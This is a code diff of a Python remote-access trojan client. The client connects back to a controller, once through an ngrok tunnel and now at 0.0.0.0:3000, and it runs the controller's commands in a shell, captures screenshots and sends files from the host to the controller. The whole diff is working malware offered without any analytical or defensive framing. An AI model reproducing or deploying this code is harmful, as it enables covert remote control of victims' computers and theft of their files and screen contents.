@@ -7,7 +7,7 @@ import mss
 
 
 
-address = ("2.tcp.ngrok.io", 18169)
+address = ("0.0.0.0", 3000)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -16,29 +16,6 @@ def take_screen_shot():
         send(img_data)
 
         del(raw_pixels, img_data)
-        
-def upload_file():
-    file_path = recv.decode()
-    
-    try:
-        file = open(file_path, "rb")
-        send(file_path.encode())
-        
-        file_data = file.read()
-        send(file_data)
-    except:
-        print("error ocurred")
-        
-        
-def download_file():
-    file_path = recv().decode()
-    file_path = file_path.split("/")
-
-
-    file_data = recv()    
-    with open(file_path.pop(), "wb") as file:
-        file.write(file_data)
-    
 
 def recv():
     data_size = int(server_con.recv(12).decode())
@@ -54,6 +31,13 @@ def send(data):
     data_size = f"{len(data):^{header_size}}"
     server_con.send(data_size.encode())
     server_con.sendall(data)
+
+def upload_file(file_name):
+    file = open(file_name, "rb")
+    file_data = file.read()
+    file.close()
+
+    send(file_data)
 
 def open_shell():
     while True:
@@ -71,6 +55,15 @@ def open_shell():
                 str_msg = "Error: " + str(sys.exc_info()[0])
             else:
                 str_msg = os.getcwd()
+
+        elif data.decode()[:2] == "dw":
+            file_name = data.decode()[3:]
+            print(f"Uploading File...{file_name}")
+            upload_file(file_name)
+        elif data.decode()[:2] == "up":
+            file_path = data.decode()[2:]
+            print(f"Downloading File...{file_path}")
+
         else:
             output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             str_msg = output[0].decode()
@@ -106,9 +99,9 @@ def main():
             open_shell()
         elif choice == "2":
             take_screen_shot()
+        elif choice == "3":
+            pass
         elif choice == "4":
-            download_file()
-        elif choice == "5":
             server_con.close()
             time.sleep(5)
             establish_connection(address)
